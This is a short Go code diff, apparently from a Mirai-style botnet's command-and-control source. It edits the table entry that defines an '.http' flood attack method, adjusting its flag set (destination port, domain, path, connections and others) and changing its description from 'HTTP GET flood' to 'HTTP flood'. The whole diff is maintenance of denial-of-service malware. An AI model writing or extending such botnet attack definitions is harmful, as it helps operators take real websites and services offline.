@@ -216,9 +216,9 @@ var Methods map[string]*Method = map[string]*Method{
 	},
 
 	".http": {
-		Type:        13,                    // o el número que corresponda, pero debe coincidir con el definido en attack.h
-		Flags:       []uint8{7, 8, 22, 24}, // dport, domain, path, conns
-		Description: "HTTP GET flood",
+		Type:        13,
+		Flags:       []uint8{8, 7, 20, 21, 22, 24},
+		Description: "HTTP flood",
 	},
 }
 
